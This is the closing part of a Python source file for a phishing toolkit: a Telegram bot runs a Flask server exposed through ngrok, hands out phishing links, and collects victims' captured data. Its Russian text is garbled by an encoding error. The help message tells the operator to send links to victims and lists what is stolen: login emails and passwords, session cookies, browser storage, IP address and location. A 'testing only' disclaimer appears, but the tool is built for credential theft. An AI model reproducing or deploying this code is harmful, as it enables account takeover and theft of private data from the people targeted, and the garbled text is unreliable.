                f"‚ùå –î–∞–Ω–Ω—ã–µ —Å ID `{data_id}` –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data == "help":
        help_message = """
üÜò *–ü–û–ú–û–©–¨ –ò –ò–ù–°–¢–†–£–ö–¶–ò–ò*

üéØ *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—É:*
1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ ngrok: `/start_ngrok`
2. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏: `/links`
3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫–∏ –∂–µ—Ä—Ç–≤–∞–º
4. –ü–æ–ª—É—á–∞–π—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
5. –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–π—Ç–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É: `/stats`

üîê *–ß—Ç–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç—Å—è:*
‚Ä¢ Email –∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ —Ñ–æ—Ä–º –≤—Ö–æ–¥–∞
‚Ä¢ Cookies —Å–µ—Å—Å–∏–∏ –±—Ä–∞—É–∑–µ—Ä–∞
‚Ä¢ –î–∞–Ω–Ω—ã–µ –∏–∑ LocalStorage/SessionStorage
‚Ä¢ User Agent –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±—Ä–∞—É–∑–µ—Ä–µ
‚Ä¢ IP –∞–¥—Ä–µ—Å –∏ –ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω—É—é –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞

‚ö° *–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã:*
‚Ä¢ –†–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ ngrok (–ø—É–±–ª–∏—á–Ω—ã–π –¥–æ—Å—Ç—É–ø)
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤
‚Ä¢ –†–µ–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
‚Ä¢ –õ–æ–∫–∞–ª—å–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –≤—Å–µ—Ö –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤

üîß *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start - –ù–∞—á–∞–ª–æ —Ä–∞–±–æ—Ç—ã
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å–∫ ngrok —Ç—É–Ω–Ω–µ–ª—è
‚Ä¢ /stop_ngrok - –û—Å—Ç–∞–Ω–æ–≤–∫–∞ ngrok
‚Ä¢ /links - –ü–æ–ª—É—á–∏—Ç—å —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /data [ID] - –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /data list - –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /data last - –ü–æ—Å–ª–µ–¥–Ω–∏–µ –¥–∞–Ω–Ω—ã–µ

‚ö†Ô∏è *–í–ù–ò–ú–ê–ù–ò–ï:*
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!
‚Ä¢ –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è
‚Ä¢ –•—Ä–∞–Ω–∏—Ç–µ —Ç–æ–∫–µ–Ω—ã –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
‚Ä¢ –ù–µ –Ω–∞—Ä—É—à–∞–π—Ç–µ –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–æ

üìû *–ü–æ–¥–¥–µ—Ä–∂–∫–∞:* @admin
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"‚ö†Ô∏è *–û—à–∏–±–∫–∞ –≤ –±–æ—Ç–µ:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

def run_flask_server():
    """–ó–∞–ø—É—Å–∫ Flask —Å–µ—Ä–≤–µ—Ä–∞"""
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞"""
    global telegram_app, ngrok_manager, telegram_loop
    
    print("ü§ñ Ngrok Data Collector Bot –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    print(f"üëë –ê–¥–º–∏–Ω: {ADMIN_ID}")
    print("üîß –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤...")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è ngrok –º–µ–Ω–µ–¥–∂–µ—Ä–∞
    ngrok_manager = NgrokManager(NGROK_AUTH_TOKEN)
    
    # –°–æ–∑–¥–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    
    # –ü–æ–ª—É—á–∞–µ–º event loop –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ Flask
    telegram_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(telegram_loop)
    
    # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥
    telegram_app.add_handler(CommandHandler("start", start_command))
    telegram_app.add_handler(CommandHandler("start_ngrok", start_ngrok_command))
    telegram_app.add_handler(CommandHandler("stop_ngrok", stop_ngrok_command))
    telegram_app.add_handler(CommandHandler("links", links_command))
    telegram_app.add_handler(CommandHandler("stats", stats_command))
    telegram_app.add_handler(CommandHandler("data", data_command))
    
    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline –∫–Ω–æ–ø–æ–∫
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    
    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫
    telegram_app.add_error_handler(error_handler)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask —Å–µ—Ä–≤–µ—Ä –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
    flask_thread.start()
    
    print("‚úÖ Flask —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 8080")
    print("ü§ñ Telegram –±–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    print("‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥...")
    print("üí° –û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:")
    print("   /start - –ù–∞—á–∞–ª–æ —Ä–∞–±–æ—Ç—ã")
    print("   /start_ngrok - –ó–∞–ø—É—Å–∫ ngrok —Ç—É–Ω–Ω–µ–ª—è")
    print("   /links - –ü–æ–ª—É—á–∏—Ç—å —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏")
    print("   /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã")
    print("   /data - –ü—Ä–æ—Å–º–æ—Ç—Ä –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö")
    print("")
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!")
    print("    –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞—é—Ç—Å—è.")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Telegram –±–æ—Ç–∞
    telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    main()
